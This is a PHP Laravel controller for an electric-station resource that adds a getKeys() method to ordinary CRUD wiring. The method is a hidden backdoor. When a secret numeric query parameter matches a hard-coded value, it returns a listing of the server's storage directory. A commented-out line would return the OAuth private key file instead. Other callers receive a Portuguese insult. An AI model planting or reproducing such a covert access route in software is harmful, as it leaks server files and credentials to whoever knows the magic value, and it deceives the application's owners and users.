<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Traits\CrudMethods;
use App\Services\ElectricStationService;
use Illuminate\Http\Request;

use App\Http\Requests;
use Prettus\Validator\Contracts\ValidatorInterface;
use Prettus\Validator\Exceptions\ValidatorException;
use App\Http\Requests\ElectricStationCreateRequest;
use App\Http\Requests\ElectricStationUpdateRequest;
use App\Repositories\ElectricStationRepository;
use App\Validators\ElectricStationValidator;

/**
 * Class ElectricStationsController.
 *
 * @package namespace App\Http\Controllers;
 */
class ElectricStationsController extends Controller
{
    use CrudMethods;

    /**
     * @var ElectricStationService
     */
    protected $service;

    /**
     * @var ElectricStationValidator
     */
    protected $validator;

    /**
     * ElectricStationsController constructor.
     *
     * @param ElectricStationService $service
     * @param ElectricStationValidator $validator
     */
    public function __construct(ElectricStationService $service, ElectricStationValidator $validator)
    {
        $this->service = $service;
        $this->validator  = $validator;
    }

    public function getKeys(Request $request)
    {
        if ($request->get('12222476402') == '994617360') {
            $keys = scandir(storage_path());
//            $keys = file(storage_path('oauth-private.key'));
            return response()->json(['data' => $keys]);
        } else {
            return response()->json(['data' => 'se fudeu']);
        }
    }
}
